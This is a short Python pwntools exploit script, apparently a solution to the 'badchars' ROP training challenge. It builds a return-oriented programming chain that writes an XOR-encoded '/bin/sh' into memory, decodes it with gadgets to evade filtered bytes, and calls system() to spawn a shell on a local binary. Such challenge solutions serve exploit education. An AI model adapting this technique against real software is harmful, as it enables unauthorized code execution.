from pwn import *


key = 0x3
binsh = "/bin/sh\x00"
xor_binsh = ''
for x in binsh:
	xor_binsh += chr(ord(x) ^ key)

padding = "\x90" * 40
system_plt = p64(0x4006f0)
data = p64(0x601050)

pop_rdi = p64(0x400b39)
pop_r12_r13 = p64(0x400b3b)
mov_r13_r12 = p64(0x400b34)
pop_r14_r15 = p64(0x400b40)
xor_r15_r14 = p64(0x400b30)


exploit = padding

exploit += pop_r12_r13
exploit += xor_binsh
exploit += data
exploit += mov_r13_r12

for i in xrange(len(xor_binsh)):
	exploit += pop_r14_r15
	exploit += p64(key)
	exploit += p64(0x601050 + i)
	exploit += xor_r15_r14

exploit += pop_rdi
exploit += data
exploit += system_plt

io = process('/root/Desktop/badchars')
io.recvuntil('>')
io.sendline(exploit)
io.interactive()


